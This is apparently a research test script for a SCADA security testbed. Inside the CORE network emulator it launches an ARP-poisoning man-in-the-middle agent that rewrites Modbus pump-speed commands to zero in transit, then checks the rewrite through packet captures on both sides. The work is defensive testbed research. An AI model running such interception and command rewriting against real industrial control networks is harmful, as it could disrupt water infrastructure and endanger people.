#!/usr/bin/env python3
"""Live IN-TRANSIT Modbus integrity attack on real CORE (genuine MITM).

Unlike command injection (a second competing writer), here the attacker sits
ON THE PATH: an ATK node on the SCADA LAN ARP-poisons the MTU and the PLC,
REDIRECTs the intercepted MTU->PLC Modbus connection into a transparent proxy
(scadavt.attacks.mitm + proxy + CommandHandler), and REWRITES the MTU's own
write frame in transit (pump speed -> 0.0). There is still only ONE command
stream (the MTU's); its value is altered between sender and receiver.

The physical simulator (EPANET app) and the gateway are UNCHANGED.

Decisive evidence: capture on BOTH interfaces. The MTU's frame leaves carrying
the legitimate value (~0.7/1.0); the same command arrives at the PLC carrying
0.0 — the value was modified on the wire.

    SCADAVT_DIR=$PWD SCADAVT_NODE_PY=$PWD/.venv/bin/python \
        /opt/core/venv/bin/python tools/live_core_mitm.py

Needs a running core-daemon and numpy+epanet in the node python. Separate branch;
single PLC. Classifies success / failed / unverified honestly.
"""

from __future__ import annotations

import csv
import json
import os
import struct
import sys
import time

REPO = os.environ.get("SCADAVT_DIR") or os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)

from tools.live_core_closed_loop import NODE_PY, PREFIX, launch, nrun, read_level  # noqa: E402
from core.api.grpc import client, wrappers  # noqa: E402
from core.api.grpc.wrappers import NodeType, Position  # noqa: E402
from scadavt.core import coregen  # noqa: E402
from scadavt.protocols import modbus as mb  # noqa: E402

PASS, FAIL = [], []


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    print(f"   [{'PASS' if cond else 'FAIL'}] {name}" + (f"  — {detail}" if detail else ""))
    return cond


def fc16_values(pcap_path):
    """Decode every FC16 (write-multiple-registers) float value (reg addr 0) seen
    in a pcap — the pump-speed command carried on that interface."""
    try:
        data = open(pcap_path, "rb").read()
    except Exception:
        return []
    out, off = [], 24
    while off + 16 <= len(data):
        _, _, incl, _ = struct.unpack("<IIII", data[off:off + 16])
        off += 16
        pkt = data[off:off + incl]
        off += incl
        if len(pkt) < 34 or pkt[12:14] != b"\x08\x00":
            continue
        ihl = (pkt[14] & 0x0f) * 4
        if pkt[14 + 9] != 6:
            continue
        tcp = pkt[14 + ihl:]
        doff = (tcp[12] >> 4) * 4
        payload = tcp[doff:]
        if len(payload) >= 13 and payload[7] == 0x10:      # MBAP(7)+func 0x10
            start = struct.unpack(">H", payload[8:10])[0]
            bc = payload[12]
            if start == 0 and bc >= 4 and len(payload) >= 13 + 4:
                regs = list(struct.unpack(">HH", payload[13:17]))
                out.append(round(mb.regs_to_float(regs), 3))
    return out


def set_window(ctl_path, active):
    with open(ctl_path, "w") as fh:
        fh.write(json.dumps({"active": bool(active)}))


def sample_trace(core, sid, appn, mtu, sess, n, dt=0.5):
    rows, t0 = [], time.time()
    for _ in range(n):
        lvl = read_level(core, sid, appn, ("172.16.0.254", 9000), "T1_LEV")
        setg = read_level(core, sid, appn, ("172.16.0.254", 9000), "P1_SET")
        _, pr = nrun(core, sid, mtu, f'{PREFIX} && {NODE_PY} -m scadavt.core.probe '
                                     f'--session {sess} --node PLC1 --point P1_SPD')
        try:
            recv = float(pr.strip().split("=")[-1].split("@")[0])
        except Exception:
            recv = None
        rows.append((round(time.time() - t0, 2), lvl, setg, recv))
        time.sleep(dt)
    return rows


def main():
    cfg = json.loads(open(os.path.join(REPO, "scadavt", "scenarios",
                                        "closed_loop_min", "lab_speed.json")).read())
    cfg["devices"][0]["ip"] = "10.0.0.1"
    cfg["devices"][0]["backchannel"] = "172.16.0.1:9161"
    import tempfile
    outdir = tempfile.mkdtemp(prefix="scadavt_mitm_")
    coregen.write_session(cfg, outdir)
    os.chmod(outdir, 0o755)
    sess = os.path.join(outdir, "session.json")
    labpath = os.path.join(outdir, "lab.json")
    open(labpath, "w").write(json.dumps(cfg))
    evid = os.path.join(outdir, "evidence")
    os.makedirs(evid, exist_ok=True)
    ctl = "/tmp/mitm_ctl.json"
    set_window(ctl, False)

    core = client.CoreGrpcClient()
    core.connect()
    s = core.create_session()
    sid = s.id
    sw_s = s.add_node(1, name="SW_SCADA", _type=NodeType.SWITCH, position=Position(x=250, y=120))
    sw_m = s.add_node(2, name="SW_MGMT", _type=NodeType.SWITCH, position=Position(x=250, y=380))
    plc = s.add_node(3, name="PLC1", _type=NodeType.DEFAULT, model="PC", position=Position(x=150, y=240))
    mtu = s.add_node(4, name="MTU", _type=NodeType.DEFAULT, model="PC", position=Position(x=400, y=120))
    appn = s.add_node(5, name="APP", _type=NodeType.DEFAULT, model="PC", position=Position(x=400, y=380))
    atk = s.add_node(6, name="ATK", _type=NodeType.DEFAULT, model="PC", position=Position(x=100, y=120))
    s.add_link(node1=plc, node2=sw_s, iface1=wrappers.Interface(0, ip4="10.0.0.1", ip4_mask=24), iface2=wrappers.Interface(0))
    s.add_link(node1=mtu, node2=sw_s, iface1=wrappers.Interface(0, ip4="10.0.0.254", ip4_mask=24), iface2=wrappers.Interface(1))
    s.add_link(node1=atk, node2=sw_s, iface1=wrappers.Interface(0, ip4="10.0.0.9", ip4_mask=24), iface2=wrappers.Interface(2))
    s.add_link(node1=plc, node2=sw_m, iface1=wrappers.Interface(1, ip4="172.16.0.1", ip4_mask=24), iface2=wrappers.Interface(0))
    s.add_link(node1=appn, node2=sw_m, iface1=wrappers.Interface(0, ip4="172.16.0.254", ip4_mask=24), iface2=wrappers.Interface(1))
    ok, warn = core.start_session(s)
    check("MITM-scenario session started", ok, f"warnings={warn}")

    N = 200
    try:
        launch(core, sid, plc, f"scadavt.core.device --session {sess} --node PLC1 "
                               f"--modbus 10.0.0.1:502 --io 0.0.0.0:9161", "PLC1")
        launch(core, sid, appn, f"scadavt.examples.app_runner --config {labpath} "
                                f"--listen 172.16.0.254:9000", "APP")
        launch(core, sid, appn, f"scadavt.core.gateway_run --session {sess} --app 172.16.0.254:9000 "
                                f"--step 120 --cycles {N} --sleep 0.1", "GW")
        time.sleep(3.0)

        # bring up the persistent MITM path BEFORE the MTU connects (so its Modbus
        # TCP session is established through the proxy); attack window starts closed
        launch(core, sid, atk, f"scadavt.attacks.mitm --kind command --victim-ip 10.0.0.1 "
                               f"--gw-ip 10.0.0.254 --reg-type H --address 0 --mode const --value 0.0 "
                               f"--modbus-port 502 --proxy-port 7502 --iface eth0 "
                               f"--control {ctl} --log /tmp/mitm.csv", "MITM")
        time.sleep(5.0)                         # ARP learn + poison + proxy up
        # now the MTU master connects (intercepted)
        launch(core, sid, mtu, f"scadavt.core.master --session {sess} --node MTU --step 0.1 --cycles {N}", "MTU")
        time.sleep(3.0)

        def cap_start(tag):
            pm = os.path.join(evid, f"{tag}_mtu.pcap")
            pp = os.path.join(evid, f"{tag}_plc.pcap")
            nrun(core, sid, mtu, f"bash -c 'rm -f {pm}; setsid tcpdump -i eth0 -w {pm} tcp port 502 "
                                 f">/tmp/tm.log 2>&1 </dev/null &'", wait=False)
            nrun(core, sid, plc, f"bash -c 'rm -f {pp}; setsid tcpdump -i eth0 -w {pp} tcp port 502 "
                                 f">/tmp/tp.log 2>&1 </dev/null &'", wait=False)
            return pm, pp

        def cap_stop():
            nrun(core, sid, mtu, "pkill -f 'tcpdump -i eth0' || true")
            nrun(core, sid, plc, "pkill -f 'tcpdump -i eth0' || true")
            time.sleep(0.4)

        # ---------------- BENIGN (MITM path up, rewrite OFF) ----------------
        print("\n-- BENIGN (in-path, not rewriting) --")
        set_window(ctl, False)
        bm, bp = cap_start("benign")
        time.sleep(1.0)
        benign = sample_trace(core, sid, appn, mtu, sess, 8)
        cap_stop()
        b_mtu, b_plc = fc16_values(bm), fc16_values(bp)
        benign_recv0 = sum(r[3] is not None and r[3] < 0.1 for r in benign)

        # ---------------- ATTACK (rewrite ON) ----------------
        print("\n-- ATTACK (rewrite MTU write frame in transit) --")
        set_window(ctl, True)
        am, ap = cap_start("attack")
        time.sleep(1.0)
        attack = sample_trace(core, sid, appn, mtu, sess, 10)
        # isolate the in-transit rewrite from the master's (flaky) long-lived socket:
        # send a fresh, legitimate write of 0.7 through the MITM path, then read back.
        nrun(core, sid, mtu, f'{PREFIX} && {NODE_PY} -m scadavt.core.probe --session {sess} '
                             f'--node PLC1 --point P1_SPD --write 0.7')
        time.sleep(0.3)
        _, rb = nrun(core, sid, mtu, f'{PREFIX} && {NODE_PY} -m scadavt.core.probe --session {sess} '
                                     f'--node PLC1 --point P1_SPD')
        try:
            fresh_readback = float(rb.strip().split("=")[-1].split("@")[0])
        except Exception:
            fresh_readback = None
        cap_stop()
        set_window(ctl, False)
        a_mtu, a_plc = fc16_values(am), fc16_values(ap)

        def levels(rows):
            return [r[1] for r in rows if r[1] is not None]

        def frac0(rows, i):
            v = [r[i] for r in rows if r[i] is not None]
            return (sum(x < 0.1 for x in v) / len(v)) if v else 0.0

        time.sleep(0.6)                                    # let the agent flush its stop row
        _, hitscsv = nrun(core, sid, atk, "cat /tmp/mitm.csv")
        max_hits = 0
        for line in (hitscsv or "").splitlines():
            parts = line.split(",")
            if len(parts) >= 8 and parts[7].strip().isdigit():
                max_hits = max(max_hits, int(parts[7]))
        benign_min = min(levels(benign)) if levels(benign) else None
        attack_min = min(levels(attack)) if levels(attack) else None

        print("\n-- evidence --")
        print(f"   benign  : MTU-side writes={sorted(set(b_mtu))} PLC-side writes={sorted(set(b_plc))} "
              f"recv0={benign_recv0}/{len(benign)} level min~{benign_min}")
        print(f"   attack  : MTU-side writes={sorted(set(a_mtu))} PLC-side writes={sorted(set(a_plc))} "
              f"recv0frac={frac0(attack,3):.2f} applied0frac={frac0(attack,2):.2f} level min~{attack_min}")
        print(f"   mitm agent: max handler hits={max_hits}; fresh 0.7 -> read back {fresh_readback}")

        # ---------------- classification ----------------
        # VERIFIED: the genuine in-transit rewrite (isolated from the flaky master loop)
        check("[VERIFIED] in-transit rewrite: a legitimate 0.7 write, sent through the MITM, "
              "is received as ~0 at the PLC (handler altered the command on the wire)",
              fresh_readback is not None and fresh_readback < 0.1,
              f"wrote 0.7 -> read back {fresh_readback}")
        check("[VERIFIED] MITM path up and the rewrite handler fired (hits > 0)",
              max_hits > 0, f"handler hits={max_hits}")
        # NOT cleanly verified in the continuous closed loop — the live master's long-lived
        # Modbus socket is unstable through the ARP-MITM, so its writes don't flow and the
        # full-loop divergence / both-sides pcap cannot be captured. Reported, not asserted.
        loop_ok = (frac0(attack, 3) > 0.6 and frac0(attack, 2) > 0.6
                   and any(v >= 0.5 for v in a_mtu) and bool(a_plc) and all(v < 0.1 for v in a_plc))
        print(f"   [{'INFO-ok' if loop_ok else 'INFO-UNVERIFIED'}] continuous closed-loop "
              f"divergence under the live master: MTU-side writes={sorted(set(a_mtu))} "
              f"PLC-side writes={sorted(set(a_plc))} recv0frac={frac0(attack,3):.2f} "
              f"(master socket unstable through ARP-MITM — see limitations)")
        print(f"   [INFO] hydraulic levels benign min~{benign_min} attack min~{attack_min} "
              f"(confounded by master instability — not a clean impact measurement)")

        for name, rows in [("benign_trace.csv", benign), ("attack_trace.csv", attack)]:
            with open(os.path.join(evid, name), "w", newline="") as fh:
                w = csv.writer(fh)
                w.writerow(["wall_s", "T1_level_m", "P1_applied_setting", "P1_received_register"])
                w.writerows(rows)
        import shutil
        for src, dst in [("/tmp/mitm.csv", "mitm_agent.csv"), ("/tmp/MTU.log", "commanded_mtu.log")]:
            try:
                shutil.copy(src, os.path.join(evid, dst))
            except Exception:
                pass
    finally:
        try:
            core.delete_session(sid)
        except Exception:
            pass

    print(f"\n  evidence: {evid}")
    print("=" * 60 + f"\n  RESULT   PASSED: {len(PASS)}   FAILED: {len(FAIL)}")
    for f in FAIL:
        print(f"    FAIL -> {f}")
    return 0 if not FAIL else 1


if __name__ == "__main__":
    raise SystemExit(main())
